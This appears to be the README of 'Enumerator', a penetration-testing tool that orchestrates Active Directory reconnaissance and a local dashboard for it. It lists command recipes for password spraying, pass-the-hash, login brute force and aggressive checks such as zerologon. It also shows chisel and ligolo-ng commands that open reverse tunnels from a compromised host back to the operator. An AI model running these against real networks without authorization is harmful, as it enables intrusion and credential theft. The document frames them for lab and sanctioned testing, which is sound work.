<p align="center">
  <img src="docs/images/enumerator-overview-1.jpg" alt="Enumerator overview" width="1000">
</p>

<p align="center">
  <img src="docs/images/enumerator-dashboard-1.jpg" alt="Enumerator dashboard" width="1000">
</p>

# Enumerator

**Enumerator** is an fscan-driven Active Directory recon aggregator with two interfaces:

- a **command-line workflow** for fast operator-driven enumeration;
- a **localhost-only web dashboard** for launching scans, reviewing results, and exporting a PDF report.

> Authorized testing only. Use this tool only on systems you own or environments where you have explicit written permission to test, such as HTB/PG labs, internal ranges, or sanctioned engagements.

---

## Table of Contents

- [Overview](#overview)
- [CLI Tutorial](#cli-tutorial)
  - [What you need](#what-you-need)
  - [The two modes](#the-two-modes)
  - [How a run is structured](#how-a-run-is-structured)
  - [Where the output goes](#where-the-output-goes)
  - [Full flag reference](#full-flag-reference)
  - [Recipes](#recipes)
  - [Reading the results](#reading-the-results)
  - [Pivoting](#pivoting)
  - [Troubleshooting](#troubleshooting)
- [Dashboard UI Tutorial](#dashboard-ui-tutorial)
  - [Start it](#start-it)
  - [The layout](#the-layout)
  - [Launch a scan](#launch-a-scan)
  - [Watch it live](#watch-it-live)
  - [Read the results in the UI](#read-the-results-in-the-ui)
  - [Export the PDF report](#export-the-pdf-report)
  - [Manage runs](#manage-runs)
  - [Notes and safety](#notes-and-safety)
- [Authorized Use](#authorized-use)

---

## Overview

`enumerator.sh` is an Active Directory recon aggregator that runs the same tools you would normally run by hand — `fscan`, `NetExec (nxc)`, `ldapsearch`, `impacket`, `BloodHound`, `certipy`, `hashcat`, `ffuf` / `feroxbuster`, `nuclei`, and more — but orchestrates them, routes checks by open port, collects loot, and in authenticated mode builds a BloodHound attack path with copy-ready commands. The dashboard is a local FastAPI front-end that launches scans, streams them live, parses results into readable tabs, and exports a PDF report.

---

## CLI Tutorial

### What you need

Enumerator assumes a normal Kali or pentest box with the usual tools available in `PATH`. The script degrades gracefully: if a tool is missing, it skips that step and tells you instead of hard-failing the entire run. 

Tools used when present:

- `fscan`
- `netexec` / `nxc`
- `ldapsearch`
- `impacket-*` such as `secretsdump.py`, `GetUserSPNs.py`, `GetNPUsers.py`
- `bloodhound-python`
- `certipy`
- `bloodyAD`
- `targetedKerberoast.py`
- `hashcat` / `john`
- `ffuf` / `feroxbuster`
- `nuclei`
- `nikto`
- `sqlmap`
- `testssl.sh` / `sslscan`
- `hydra`
- `kerbrute`
- `enum4linux-ng`
- `rpcclient`
- `smbclient`
- `evil-winrm`
- `proxychains4`
- `chisel`
- `ligolo-ng`

```bash
chmod +x enumerator.sh
./enumerator.sh --usage
```

### The two modes

| Mode | Invocation | What it does |
|---|---|---|
| Unauthenticated | `./enumerator.sh --unauth <ip>` | Sweep plus per-service checks with no credentials, including anonymous SMB/LDAP/FTP, web enumeration, AS-REP roasting, and null-session style checks.  |
| Authenticated | `./enumerator.sh --auth <ip> -u <user> -p <pass> -d <domain>` | Everything above plus credentialed LDAP, share loot, BloodHound collection and attack-path analysis, ADCS / certipy, Kerberoast, LAPS / gMSA / GPP, NTDS-oriented paths, and flags.|

```bash
# Quick anonymous look at a host
./enumerator.sh --unauth 10.10.10.10

# Full credentialed AD sweep
./enumerator.sh --auth 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful' -d support.htb
```

Authenticated mode needs `-u` and one of `-p` or `-H`. The `-d <domain>` argument is important for LDAP-heavy and Kerberos-heavy workflows.

### How a run is structured

Each run follows a four-phase workflow: port discovery with `fscan`, per-service enumeration based on discovered ports, vulnerability lead generation including optional aggressive checks, and finally summary generation with prioritized leads and an attack path.]

```text
PHASE 1  PORT DISCOVERY      fscan, all 65535 TCP ports (no nmap)
PHASE 2  PER-SERVICE ENUM    each open port routed to its handler
PHASE 3  VULNERABILITY LEADS zerologon/nopac/petitpotam, ADCS, spray (with --aggressive)
PHASE 4  SUMMARY             _SUMMARY.txt + prioritized leads + attack path
```

Port-to-handler routing:

| Ports | Handler |
|---|---|
| 21 | FTP (anonymous login, loot download). |
| 22 / 23 | SSH / Telnet. |
| 25 / 465 / 587 | SMTP (user enumeration).  |
| 53 | DNS (zone transfer, SRV).  |
| 88 | Kerberos (AS-REP roast, kerbrute).  |
| 80 / 443 / 8000 / 8080 / 8443 / 8888 | HTTP/S (tech fingerprinting, fuzzing, vulnerability checks).  |
| 110 / 995 | POP3.  |
| 111 / 2049 | NFS (showmount, mount).  |
| 135 / 593 | MSRPC.  |
| 139 / 445 | SMB (shares, signing, RID enumeration, loot).  |
| 143 / 993 | IMAP.  |
| 161 | SNMP.  |
| 389 / 636 / 3268 / 3269 | LDAP (dump, BloodHound, ADCS, trusts).  |
| 1433 | MSSQL.  |
| 3306 | MySQL.  |
| 3389 | RDP.  |
| 5985 / 5986 | WinRM (evil-winrm, flags).  |
| 6379 | Redis.  |

### Where the output goes

Every run lands in a timestamped folder in the current directory, using a structure like `enum_<ip>_<YYYYMMDD_HHMMSS>/`. The run contains a human-readable summary, an audit trail of every command, raw scan data, per-service output, and collected loot such as BloodHound JSON, ADCS analysis, hashes, downloaded shares, and flags. 

```text
enum_<ip>_<YYYYMMDD_HHMMSS>/
├── _SUMMARY.txt
├── _commands.log
├── scans/
├── services/
└── loot/
```

Recommended reading order:

1. `_SUMMARY.txt`
2. the `LEADS / NEXT STEPS` block
3. `loot/bh_analysis.txt`
4. `loot/adcs_analysis.txt` 

By default, the terminal stays compact and writes the noisy tool output into `services/*.txt`. Use `-v` or `--verbose` if you want to stream everything live. 

### Full flag reference

#### Target and mode

| Flag | Meaning |
|---|---|
| `--unauth <ip>` | Unauthenticated sweep.  |
| `--auth <ip>` | Authenticated sweep, requiring `-u` plus `-p` or `-H`.  |

#### Credentials

| Flag | Meaning |
|---|---|
| `-u <user>` | Username.  |
| `-p <pass>` | Cleartext password.  |
| `-H <nthash>` | NT hash for pass-the-hash instead of `-p`.  |
| `-d <domain>` | AD domain, for example `support.htb`.  |
| `-k` | Use Kerberos auth for impacket and nxc.  |
| `--local` | Local authentication instead of domain authentication.  |

#### Pivot and proxy

| Flag | Meaning |
|---|---|
| `--pivot chisel` | Mark that traffic egresses through a SOCKS proxy.  |
| `--proxy-addr <url>` | SOCKS proxy address, such as `socks5://127.0.0.1:1080`.  |

#### Scope and behavior

| Flag | Meaning |
|---|---|
| `--aggressive` | Disruptive checks such as zerologon, nopac, petitpotam, Coercer, password spray, and credential spray.  |
| `--services <list>` / `--only <list>` | Run only selected handlers, for example `smb,ldap,kerberos`.  |
| `--all-services` | Run every handler, which is the default.  |
| `--no-web` | Skip the HTTP/web handler entirely.  |
| `--no-web-brute` | Skip web content discovery with ffuf or feroxbuster.  |
| `--no-web-fuzz` | Skip directory, vhost, and parameter fuzzing.  |
| `--web-vulns` | Enable OWASP-style web testing, including nikto, nuclei vuln tags, TLS and LFI checks, plus sqlmap when `--aggressive` is used.  |
| `--no-bloodhound` | Skip BloodHound collection and analysis in authenticated mode.  |
| `--no-flags` | Box-build mode, meaning do not hunt for `user.txt` or `root.txt`.  |
| `--no-loot-shares` | Do not auto-download readable SMB shares.  |
| `--no-loot-ftp` | Do not auto-download anonymous FTP content.  |

#### Wordlists, brute force, and cracking

| Flag | Default / meaning |
|---|---|
| `--web-wordlist <f>` | `seclists` raft-medium directories.  |
| `--vhost-wordlist <f>` | `seclists` top-5000 subdomains.  |
| `--param-wordlist <f>` | Burp parameter names wordlist.  |
| `--login-path <p>` + `--login-userlist <f>` + `--login-passlist <f>` + `--login-failstr <s>` | HTTP login brute force, enabled only when path and both lists are set.  |
| `--spray-wordlist <f>` | `seclists` top-1000 for password spraying.  |
| `--spray-force` | Spray the full list even if a lockout policy exists; dangerous.  |
| `--crack-wordlist <f>` | `rockyou`.  |
| `--crack-timeout <s>` | `600` seconds per cracking job.  |

#### Output

| Flag | Meaning |
|---|---|
| `-v` / `--verbose` | Stream full tool output to the terminal.  |
| `--usage` / `-h` / `--help` | Show built-in help.  |

Lockout safety is enabled by default for spray-like actions and flag-hunting login attempts, and the tool backs off when a lockout policy is detected. The `--spray-force` option overrides that protection and should only be used when you understand the environment’s lockout policy. 

### Recipes

```bash
# 1) First contact, unknown host, no creds
./enumerator.sh --unauth 10.10.10.10

# 2) Full authenticated AD assessment
./enumerator.sh --auth 10.129.230.181 -u support \
  -p 'Ironside47pleasure40Watchful' -d support.htb

# 3) Pass-the-hash instead of a password
./enumerator.sh --auth 10.129.230.181 -u administrator \
  -H 'aad3b435b51404eeaad3b435b51404ee:<nthash>' -d corp.local

# 4) Kerberos auth
export KRB5CCNAME=/tmp/user.ccache
./enumerator.sh --auth dc01.corp.local -u user -p pass -d corp.local -k

# 5) Box-build mode
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb --no-flags

# 6) Aggressive AD run
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb --aggressive

# 7) Only specific services
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb \
  --services smb,ldap,kerberos

# 8) Web-focused, with full OWASP vuln testing
./enumerator.sh --unauth 10.10.11.20 --services web --web-vulns

# 9) HTTP login brute against a form
./enumerator.sh --unauth 10.10.11.20 --services web \
  --login-path /login.php \
  --login-userlist users.txt \
  --login-passlist /usr/share/wordlists/rockyou.txt \
  --login-failstr 'Invalid'

# 10) Custom spray and crack lists
./enumerator.sh --auth 10.129.230.181 -u support -p 'pass' -d support.htb \
  --aggressive --spray-wordlist mylist.txt --crack-wordlist rockyou.txt
```


### Reading the results

`_SUMMARY.txt` contains open ports, per-service one-liners, and a `LEADS / NEXT STEPS` block. Leads are prioritized as `[!!]` critical, `[!]` notable, and `[+]` good-to-have, and each lead points to the file with supporting detail and a suggested next command. 

`loot/bh_analysis.txt` is the authenticated-mode privesc playbook. For each object you can abuse, such as a DC computer account, a user, or a group, it prints routes like Shadow Credentials, RBCD, Targeted Kerberoast, force-reset, add-self-to-group, and DCSync, along with exact commands and a HackTricks link. 

`loot/adcs_analysis.txt` summarizes vulnerable certificate templates such as ESC1, ESC2, ESC3, ESC4, ESC6, ESC7, and ESC8, including the certipy request-to-auth-to-pass-the-hash chain. The `loot/` directory can also contain valid credentials, NTDS dumps, candidate secrets, LDAP-derived findings, downloaded shares, FTP content, BloodHound JSON, and flags unless flag collection was disabled. 

### Pivoting

Once you have a foothold, you often need to enumerate an internal subnet that the compromised host can reach but your Kali box cannot. Enumerator supports two clean pivoting models: `chisel` for reverse SOCKS5 and `ligolo-ng` for a routed TUN interface. The tool is pivot-aware and applies SOCKS or `proxychains4 -q` per tool where appropriate. 

> Never launch `enumerator.sh` itself under `proxychains`. The documented approach is to use `--pivot chisel` and `--proxy-addr`, because wrapping the orchestrator itself is explicitly unsupported. 

#### Option A — chisel

Best when you want a SOCKS proxy and do not want to touch routing.

```bash
# 1) On Kali — start a chisel server in reverse mode
./chisel server -p 9001 --reverse

# 2) On the compromised foothold host
./chisel client YOUR_KALI_IP:9001 R:1080:socks

# 3) Back on Kali — run Enumerator through that SOCKS proxy
./enumerator.sh --auth 172.16.1.20 -u jdoe -p 'Winter2025!' -d corp.local \
  --pivot chisel --proxy-addr socks5://127.0.0.1:1080
```

In this mode, `fscan`, `ffuf`, `feroxbuster`, and `nuclei` get the SOCKS proxy natively, while libc-based tools are auto-prefixed with `proxychains4 -q`. If you run one-off commands manually, you may still need a matching `proxychains4.conf` entry yourself. 

#### Option B — ligolo-ng

Best when you want transparent routed access to the internal subnet.

```bash
# 1) On Kali — create and bring up the ligolo TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2) On Kali — start the ligolo proxy
./proxy -selfcert

# 3) On the compromised host — connect the agent back
./agent -connect YOUR_KALI_IP:11601 -ignore-cert
# Windows:
# agent.exe -connect YOUR_KALI_IP:11601 -ignore-cert

# 4) In the ligolo console — select the session and start the tunnel
ligolo-ng » session
ligolo-ng » start

# 5) On Kali — route the internal subnet
sudo ip route add 172.16.1.0/24 dev ligolo

# 6) Run Enumerator normally
./enumerator.sh --auth 172.16.1.20 -u jdoe -p 'Winter2025!' -d corp.local
```

To catch reverse shells or relays back through the tunnel, you can add a ligolo listener. 

```bash
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

#### Which to use?

| Aspect | chisel | ligolo-ng |
|---|---|---|
| Mechanism | SOCKS5 proxy.  | Routed TUN interface.  |
| Tool invocation | `--pivot chisel --proxy-addr socks5://127.0.0.1:1080`.  | Normal execution after routing is in place.  |
| `proxychains` for ad-hoc tools | Usually yes.  | No.  |
| UDP / ICMP | TCP only.  | Works via TUN.  |
| Multi-hop | Chain clients.  | Start additional agents and routes.  |

Pivoting tips:
- `fscan` over a pivot can be slow because it still sweeps all TCP ports. Narrow the scope with `--services` if needed. 
- SOCKS is TCP-only, so Kerberos or DNS edge cases may behave better over ligolo’s TUN model. 
- For AD name resolution over a pivot, point the box at the internal DC for DNS or use IPs with `-d <domain>` explicitly. 

### Troubleshooting

| Symptom | Fix |
|---|---|
| “requires -u / -p” | Auth mode needs `-u` and one of `-p` or `-H`.  |
| A tool step is skipped | That tool is not installed or not in `PATH`; install it or ignore that feature.  |
| Script refuses to start with proxychains | Do not wrap the script in `proxychains`; use `--pivot` and `--proxy-addr` instead.  |
| Accounts getting locked | Drop `--spray-force`; default behavior is lockout-aware.  |
| Too noisy on screen | Default output is already compact; read `services/*.txt` and only add `-v` when debugging.  |
| Slow over a pivot | Prefer ligolo TUN when possible and reduce scope with `--services`.  |

---

## Dashboard UI Tutorial

### Start it

The dashboard is a small FastAPI application that serves a single-page UI on `127.0.0.1`. It reads the `enum_<ip>_<stamp>` run folders produced by the scanner and can launch new scans for you. 

The dashboard directory must contain:
- `server.py`
- `report.py`
- `run.sh`
- `requirements.txt`
- `static/index.html` 

```bash
cd enum_dashboard
./run.sh
```

`run.sh` creates a Python virtual environment, installs dependencies such as FastAPI, uvicorn, and reportlab, auto-detects where your run folders and `enumerator.sh` live, and serves the UI locally. Then open `http://127.0.0.1:8000`. 

#### Options and environment variables

| Variable / arg | Purpose | Default |
|---|---|---|
| `./run.sh <scan_root>` | Folder that holds the `enum_*` run folders.  | Auto-detected.  |
| `./run.sh <scan_root> <port>` | Bind port.  | `8000`.  |
| `ENUM_SCAN_ROOT` | Same as `scan_root`.  | Auto.  |
| `ENUM_SCRIPT` | Path to `enumerator.sh`.  | Auto.  |
| `ENUM_PORT` / `ENUM_HOST` | Port and bind host.  | `8000` / `127.0.0.1`.  |
| `ENUM_ALLOW_SCAN=0` | View-only mode that disables launching scans.  | Scanning enabled.  |

It binds to localhost only. For remote access, the recommended model is an SSH tunnel such as `ssh -L 8000:127.0.0.1:8000 user@kali` instead of exposing it directly. 

### The layout

Top bar actions:
- run dropdown to choose the completed run you are viewing;
- refresh button to rescan the run list;
- export report button to download the PDF for the selected run;
- delete button to remove the selected run folder from disk;
- new scan button to jump to the Live Scan form. 

Main tabs:

| Tab | What it contains |
|---|---|
| Overview | Verdict, key stats, credentials you hold, what to do next, priority leads, users and computers, flags.  |
| Ports | Open ports and the parsed service table.  |
| Creds | Validated credentials, candidate secrets, LDAP-sourced secrets, flags.  |
| Loot | All collected files grouped by type, with sizes and text-file viewing.  |
| Web | Per-port web technologies, discovered content with status codes, and nuclei findings.  |
| BloodHound | Capability summary, route cards with copy-ready commands, HackTricks links, supporting findings, and the domain inventory.  |
| Commands | Tools used and the full filterable command log, with copy buttons.  |
| Live Scan | Form-driven scan launch and live monitoring.  |

### Launch a scan

The Live Scan form maps directly to `enumerator.sh` flags. 

| Form control | Flag it sets |
|---|---|
| mode (auth / unauth) | `--auth` / `--unauth`.  |
| target IP / host | The target.  |
| username / password / domain | `-u` / `-p` / `-d`.  |
| All services or selected services | Default behavior or `--services <list>`.  |
| Enumerate web | On by default; off sets `--no-web`.  |
| Web fuzzing | On by default; off sets `--no-web-fuzz`.  |
| OWASP vuln tests | `--web-vulns`.  |
| Download readable SMB shares | On by default; off sets `--no-loot-shares`.  |
| Download anonymous FTP | On by default; off sets `--no-loot-ftp`.  |
| Use BloodHound | On by default; off sets `--no-bloodhound`.  |
| Hunt for flags | On by default; off sets `--no-flags`.  |
| Aggressive | `--aggressive`.  |
| Advanced login / wordlist fields | Matching `--login-*` and `--*-wordlist` flags.  |

Press launch scan and the UI switches to the live console. 

### Watch it live

The live console shows a green “scan running” header with a live dot and streams lines as they are produced. Output is color-coded for leads, flags, critical findings, warnings, good findings, and section headers. 

The stop action kills `fscan` and its child processes as a process group. When the run finishes, the header changes to “scan done”, the new run is added to the dropdown, and the parsed results become immediately available in the other tabs. 

You can leave the Live Scan tab while a job is still running. Other tabs display a scan-running banner with a shortcut back to the live console. 

### Read the results in the UI

The documented place to start is **Overview**, because it gives you the verdict, stats, credentials you hold, highlighted next actions, condensed attack-path cards, priority leads, user and computer tables, and flags in one place. 

For full privilege-escalation logic, open the **BloodHound** tab. Each attack path is shown as route cards such as Shadow Credentials, RBCD, Targeted Kerberoast, force-reset, add-self-to-group, DCSync, and ADCS ESC paths, complete with numbered steps, copyable commands, and a HackTricks reference. 

The **Loot** tab is for browsing collected files, while **Commands** is the complete filterable audit trail of the run. 

### Export the PDF report

Select a run and click export report to generate a single sectioned PDF called “Enumeration report”. The exported report includes executive summary, scope, ports and services, loot with credential source context, all collected files and shares, flags, BloodHound attack paths, web and fuzzing findings, and the full command-line history. 

The button shows progress and confirms the download when successful, or reports a clear error if something goes wrong. 

### Manage runs

You can switch runs from the dropdown at any time. The refresh action rescans the folder for new and old runs, while the delete action removes the selected run directory from disk and stops it first if it is still active. 

### Notes and safety

The server is localhost-only, and remote access should go through an SSH tunnel. Setting `ENUM_ALLOW_SCAN=0` turns the dashboard into a read-only viewer so you can share results without allowing new launches. 

The dashboard runs the same `enumerator.sh`, so the same lockout-awareness and authorized-use rules apply. Every launched action is captured in that run’s command log. 

Tip: the dashboard and CLI are interchangeable. Runs created from the command line appear automatically in the dashboard, and runs launched from the dashboard are still ordinary `enum_<ip>_<stamp>` folders you can inspect manually. 

---

## Authorized Use

This project is intended only for machines you own or environments where you have explicit written authorization to test. Both the CLI and the dashboard are documented as authorized-use tools, and both preserve an audit trail of actions through the run output and command logs. 
